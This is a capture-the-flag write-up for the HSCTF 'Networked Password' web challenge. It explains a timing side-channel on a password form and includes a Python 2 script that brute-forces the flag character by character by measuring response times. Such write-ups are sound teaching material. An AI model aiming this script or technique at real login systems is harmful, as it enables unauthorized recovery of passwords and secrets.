Networked Password
==================
**Category:** Web

**Points:** 316 (dynamic)

**Description:** 
Storing passwords on my own server seemed unsafe, so I stored it on a seperate 
one instead. However, the connection between them is very slow and I have no 
idea why.  
https://networked-password.web.chal.hsctf.com/

-------------------------------------------------------------------------------

Solution
--------

It starts with a stupid guess. The description mentions connection speed, but
if testing with a random character in the submit form the site returns
“Incorrect Password” pretty quickly, really. So let's put in something longer.
“asdasdasd” also responds almost instantly. But entering the string “hsctf{”
creates a couple seconds of delay.

Hmm. It seems that the server is analyzing the passwords in such a way that
queries beginning with more of the flag take longer than queries with less of
the flag. Perhaps the backend is slowly comparing one character at a time, and
returning as soon as a mismatch is found. Or something to that effect&#8212;it
doesn't really matter.

This problem sort of reminded me of “A Simple Question” from picoCTF 2018, so I
reused some of my Python code from that question. My solve script is attached
below.

```python
#!/usr/bin/python2
# imyxh

import mechanize
import time

# init
br = mechanize.Browser()
br.open('https://networked-password.web.chal.hsctf.com/')
payl = 'hsctf{'

while 1:  # one iteration per char
    c = 48  # initial ASCII code

    while 1:  # guess char

        br.select_form(nr=0)
        attempt = payl + chr(c)
        br.form['password'] = attempt
        t0 = time.time()
        br.submit()
        resp = br.response().get_data()
        print('attempted char ' + chr(c) + ' with response time '
              + str(time.time()-t0))

        if c == 125:
            resp = raw_input('select character: ')
            payl += resp
            break

        c += 1

    print("CAUGHT: " + payl)
```

Yes, I know. It's Python 2. Blame the mechanize developers for not releasing a
Python 3 version of their library. But the essentials of that script are
summarized in a few steps:

1. define a payload variable `payl` that holds the characters of the flag that
   we know;
2. append ASCII characters to the payload one at a time, submitting the form
   and measuring the response time;
3. display the response times for each character to the console and allow the
   user to select a guess;
4. add the user's guess to the payload and repeat from step 2.

By the time we guess the `}` character, we'll have the entire flag. I definitely
could've made that script a lot cooler by automatically selecting a character
after it produced an outlying response time, but I was lazy and perfectly happy
with pushing buttons on my terminal.

